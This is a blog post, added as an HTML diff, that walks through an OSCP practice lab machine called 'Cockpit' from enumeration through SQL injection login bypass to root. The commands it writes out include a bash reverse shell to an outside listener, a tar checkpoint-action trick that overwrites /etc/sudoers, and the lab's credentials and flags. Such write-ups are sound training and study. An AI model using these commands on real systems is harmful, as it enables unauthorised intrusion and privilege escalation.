@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>OSCP - Cockpit - Linux :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Cockpit This one was originally listed as &ldquo;Hard&rdquo; in my list, but when I checked during startup it showed as &ldquo;Intermediate&rdquo;. Definitely don&rsquo;t think it should be listed as &ldquo;Intermediate&rdquo; though - this was definitely the trickest boxes I&rsquo;ve done, and I absolutely leaned heavily on the walkthrough to make progress here.
+The biggest challenge ofcourse was the box breaking everytime I tried to run gobuster against it to find directories or files. Turned out there was a hidden login.php file on the port 80 server, but I couldn&rsquo;t find the damn thing with the first few gobuster scans because the whole box would break and require revert. Worse was finding the blocked.html page which would break the box every time I visited it OR scanned it with gobuster.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/oscp---cockpit---linux/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="OSCP - Cockpit - Linux">
+<meta property="og:description" content="Cockpit This one was originally listed as &ldquo;Hard&rdquo; in my list, but when I checked during startup it showed as &ldquo;Intermediate&rdquo;. Definitely don&rsquo;t think it should be listed as &ldquo;Intermediate&rdquo; though - this was definitely the trickest boxes I&rsquo;ve done, and I absolutely leaned heavily on the walkthrough to make progress here.
+The biggest challenge ofcourse was the box breaking everytime I tried to run gobuster against it to find directories or files. Turned out there was a hidden login.php file on the port 80 server, but I couldn&rsquo;t find the damn thing with the first few gobuster scans because the whole box would break and require revert. Worse was finding the blocked.html page which would break the box every time I visited it OR scanned it with gobuster.
+" />
+<meta property="og:url" content="/posts/oscp---cockpit---linux/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/oscp---cockpit---linux/">OSCP - Cockpit - Linux</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="cockpit">Cockpit<a href="#cockpit" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>This one was originally listed as &ldquo;Hard&rdquo; in my list, but when I checked during startup it showed as &ldquo;Intermediate&rdquo;. Definitely don&rsquo;t think it should be listed as &ldquo;Intermediate&rdquo; though - this was definitely the trickest boxes I&rsquo;ve done, and I absolutely leaned heavily on the walkthrough to make progress here.</p>
+<p>The biggest challenge ofcourse was the box breaking everytime I tried to run <code>gobuster</code> against it to find directories or files. Turned out there was a hidden <code>login.php</code> file on the port <code>80</code> server, but I couldn&rsquo;t find the damn thing with the first few gobuster scans because the whole box would break and require revert. Worse was finding the <code>blocked.html</code> page which would break the box every time I visited it OR scanned it with <code>gobuster</code>.</p>
+<p>The biggest lesson out of this was quite unexpected though, and it was how to use <code>Seclists</code>! I&rsquo;d known about <code>SecLists</code> for a fair while and assumed them were just an alternative set of user &amp; password lists, but it turns out there&rsquo;s all sorts of tips on bypassing logins with SQLi, php plugins for reverse shells, and a mountain of other things I usually need to look up online. Not sure how much I&rsquo;ll use it going forward, but it&rsquo;s certainly an option when Google isn&rsquo;t providing the answers I need.</p>
+<p>The privilege escalation was a tricky one too, although it was more about following the walkthrough and matching up what was in the GTFObin with what the walkthrough was showing. I understand it all in principle, but actually figuring out each every step on my own would have been a massive stretch - the walkthrough was vital here, and having now followed the process to get the privesc I&rsquo;m optimistic I&rsquo;ll be able to adapt to a similar process if I find a similar GTFObin in the future.</p>
+<h1 id="resolution-summary">Resolution summary<a href="#resolution-summary" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Ran Nmap to identify ports <code>22</code>, <code>80</code>&amp; <code>9090</code></li>
+<li>Ran <code>gobuster</code> against port <code>80</code> and identified <code>login.php</code></li>
+<li>Identified <code>blaze</code> and used MySQLi bypass to access admin</li>
+<li>Identified base64 encoded credentials and decoded them with cyberchef</li>
+<li>Used decoded credentials to login to port <code>9090</code></li>
+<li>Accessed terminal emulator inside admin panel and created reverse shell for initial access</li>
+<li>Checked sudo privileges and identified relevant GTFObin for <code>tar</code></li>
+<li>Created <code>paylaod.sh</code> to abuse <code>sudo</code> privileges echo into <code>/etc/sudoers</code> with tar backup</li>
+<li>Created checkpoint and ran <code>sudo tar</code> command</li>
+<li>Checked <code>sudo -l</code> to confirm new privileges,</li>
+<li>Switched user to <code>root</code> and printed <code>proof.txt</code></li>
+</ul>
+<h2 id="improved-skills">Improved skills<a href="#improved-skills" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Using Seclists to find MySQL injections</li>
+<li>Using Cyberchef to ID hashes/encoding</li>
+</ul>
+<h2 id="used-tools">Used tools<a href="#used-tools" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>nmap</li>
+<li>gobuster</li>
+<li>Hashcat</li>
+<li>Cyberchef</li>
+<li>Seclists</li>
+</ul>
+<hr>
+<h1 id="information-gathering">Information Gathering<a href="#information-gathering" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Scanned all TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -sV -oN Cockpit.nmap 192.168.244.10 -v
+</span></span></code></pre></div><p>Enumerated open TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http        Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl">9090/tcp open  zeus-admin?
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_drda-info: TIMEOUT
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest, HTTPOptions: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-DNS-Prefetch-Control: off
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Referrer-Policy: no-referrer
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Content-Type-Options: nosniff
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;Content-Type&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;text/html; charset=utf-8&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;style&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     body <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     margin: 0<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     font-family: <span class="s2">&#34;RedHatDisplay&#34;</span>, <span class="s2">&#34;Open Sans&#34;</span>, Helvetica, Arial, sans-serif<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     font-size: 12px<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     line-height: 1.66666667<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     color: <span class="c1">#333333;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     background-color: <span class="c1">#f5f5f5;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     border: 0<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     vertical-align: middle<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     font-weight: 300<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     margin: <span class="m">0</span> <span class="m">0</span> 10px<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    @font-face <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data.
+</span></span></code></pre></div><hr>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="port-22---ssh-openssh-82p1">Port 22 - SSH (OpenSSH 8.2p1)<a href="#port-22---ssh-openssh-82p1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>No enumeration conducted</p>
+<h2 id="port-80---http-apache-2441">Port 80 - HTTP (Apache 2.4.41)<a href="#port-80---http-apache-2441" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Navigated to <code>http://192.168.244.10:80</code> and identified <code>Apache HTTP Server v 2.4.41</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image1.png" alt="OSCP Cockpit Linux Image1"></li>
+<li>Ran <code>gobuster dir -u http://192.168.244.10 -w //usr/share/dirb/wordlists/big.txt -x php,html,txt</code> to identify available files - identified <code>blocked.html</code> before target machine crashed.
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image2.png" alt="OSCP Cockpit Linux Image2"></li>
+<li>Navigated to <code>http://192.168.244.10/blocked.html</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image3.png" alt="OSCP Cockpit Linux Image3"></li>
+<li>Viewed source for <code>http://192.168.244.10/blocked.html</code> and found no further information
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image4.png" alt="OSCP Cockpit Linux Image4"></li>
+<li>Forced to revert machine second time because target had crashed again after accessing <code>blocked.html</code></li>
+<li>Re-ran <code>gobuster</code> with more threads and 400/403/404 blacklisted:  <code>gobuster dir -u http://192.168.244.10 -w //usr/share/dirb/wordlists/big.txt -x php,html,txt -t 42 -b 404,403,400</code> - created many errors but identified <code>login.php</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image5.png" alt="OSCP Cockpit Linux Image5"></li>
+<li>Navigated to <code>http://192.168.244.10/login.php</code> and identified <code>Blaze</code> login - attempted login with credentials <code>admin:admin</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image6.png" alt="OSCP Cockpit Linux Image6"></li>
+<li>Checked <code>/usr/share/wordlists/seclists/Fuzzing/Databases</code> for potential login bypass suggestion - identified <code>MySQL-SQLi-Login-Bypass.fuzzdb.txt</code> and viewed it
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image7.png" alt="OSCP Cockpit Linux Image7"></li>
+<li>Attempted login to <code>http://192.168.244.10/login.php</code> with username <code>'OR '' = '</code> - gained access to <code>password-dashboard.php</code>  and identified encoded passwords
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image8.png" alt="OSCP Cockpit Linux Image8"></li>
+<li>Copied passwords into <code>CyberChef</code> and identified base64-encoded credentials <code>james:canttouchhhthiss@455152</code> &amp; <code>cameron:thisscanttbetouchedd@455152</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image9.png" alt="OSCP Cockpit Linux Image9">
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image10.png" alt="OSCP Cockpit Linux Image10"></li>
+</ul>
+<h2 id="port-9090---zeus-admin">Port 9090 - zeus-admin<a href="#port-9090---zeus-admin" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Navigated to <code>http://192.168.244.10:9090</code> and received invalid security certificate warning
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image11.png" alt="OSCP Cockpit Linux Image11"></li>
+<li>Viewed Certificate and identified potential MD5 hash in <code>Organisation</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image12.png" alt="OSCP Cockpit Linux Image12"></li>
+<li>Copied MD5 hash to <code>cert.hash</code> and ran <code>hashcat -m 0 cert.hash /usr/share/wordlists/rockyou.txt --force</code> - failed to find a match in <code>rockyou.txt</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image13.png" alt="OSCP Cockpit Linux Image13"></li>
+<li>Proceeded to website and identified server login interface and <code>Ubuntu 20.04.6 LTS</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image14.png" alt="OSCP Cockpit Linux Image14"></li>
+<li>Checked page source and identified script for &ldquo;Cockpit&rdquo; login
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image15.png" alt="OSCP Cockpit Linux Image15"></li>
+<li>Attempted password guessing with credentials <code>admin:admin</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image16.png" alt="OSCP Cockpit Linux Image16"></li>
+<li>Attempted password guessing with credentials <code>admin:password</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image17.png" alt="OSCP Cockpit Linux Image17"></li>
+<li>Attempted login with credentials <code>james:canttouchhhthiss@455152</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image18.png" alt="OSCP Cockpit Linux Image18"></li>
+<li>Attempted login with credentials <code>cameron:thisscanttbetouchedd@455152</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image19.png" alt="OSCP Cockpit Linux Image19"></li>
+</ul>
+<hr>
+<h1 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Reattempted login with credentials <code>james:canttouchhhthiss@455152</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image20.png" alt="OSCP Cockpit Linux Image20"></li>
+<li>Identified &ldquo;Terminal&rdquo; and achieved command execution on target - ran <code>cat local.txt</code> to print <code>fa9343d03bf9cbb2e6ae3c5af22043dc</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image21.png" alt="OSCP Cockpit Linux Image21"></li>
+<li>Started netcat listener on port <code>4444</code> and ran <code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.45.155/4444 0&gt;&amp;1</code> on target to establish reverse shell
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image22.png" alt="OSCP Cockpit Linux Image22">
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image23.png" alt="OSCP Cockpit Linux Image23"></li>
+</ul>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="local-enumeration">Local Enumeration<a href="#local-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>sudo -l</code> and identified <code>james</code> can run <code>/usr/bin/tar -czvf /tmp/backup.tar.gz *</code> as root without a password
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image24.png" alt="OSCP Cockpit Linux Image24"></li>
+<li>Identified <a href="https://gtfobins.github.io/gtfobins/tar/">GTFObin for <code>tar</code></a> using <code>sudo</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image25.png" alt="OSCP Cockpit Linux Image25"></li>
+</ul>
+<h2 id="privilege-escalation-vector">Privilege Escalation vector<a href="#privilege-escalation-vector" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Navigated to <code>/tmp</code> and ran <code>touch payload.sh</code> to create <code>payload.sh</code> file, then ran following commands to add to <code>payload.sh</code> and setup backup using wildcard</li>
+</ul>
+<pre tabindex="0"><code>echo &#34;echo &#39;james ALL=(root) NOPASSWD: ALL&#39; &gt; /etc/sudoers&#34; &gt; payload.sh
+echo &#34;&#34; &gt; &#39;--checkpoint=1&#39;
+echo &#34;&#34; &gt; &#39;--checkpoint-action=exec=sh payload.sh&#39;
+</code></pre><p><img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image26.png" alt="OSCP Cockpit Linux Image26"></p>
+<ul>
+<li>Ran command <code>sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image27.png" alt="OSCP Cockpit Linux Image27"></li>
+<li>Ran <code>sudo -l</code> to check new sudo privileges for <code>james</code>, ran  <code>sudo /bin/bash</code> to become <code>root</code>, then ran <code>cat /root/proof.txt</code> to print <code>d8381218cb60a519ac20d2b75b8e1fec</code>
+<img src="/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image28.png" alt="OSCP Cockpit Linux Image28"></li>
+</ul>
+<hr>
+<h1 id="trophy--loot">Trophy &amp; Loot<a href="#trophy--loot" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><code>local.txt</code> = <code>fa9343d03bf9cbb2e6ae3c5af22043dc</code>
+<code>root.txt</code> = <code>d8381218cb60a519ac20d2b75b8e1fec</code></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/oscp---clue---linux/" class="button inline prev">
+        &lt; [<span class="button__text">OSCP - Clue - Linux</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/oscp---codo---linux/" class="button inline next">
+         [<span class="button__text">OSCP - Codo - Linux</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
